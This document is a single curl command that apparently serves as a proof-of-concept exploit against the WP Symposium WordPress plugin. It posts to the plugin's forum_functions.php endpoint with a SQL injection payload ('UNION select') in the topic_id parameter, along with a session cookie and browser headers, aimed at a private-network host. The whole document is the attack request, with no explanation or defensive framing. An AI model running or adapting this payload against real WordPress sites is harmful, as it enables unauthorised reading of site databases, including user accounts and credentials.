curl -i -XPOST "http://10.0.0.40/wordpress/wp-content/plugins/wp-symposium/ajax/forum_functions.php" \
	-H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
	-H "X-Requested-With: XMLHttpRequest" \
	-H "Cookie: PHPSESSID=5ff2u5gdrbdbir43uf5vdjsidh" \
	-H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0" \
	-d "action=getTopic&topic_id=1 UNION select 1,2,3-- -&group_id=0"
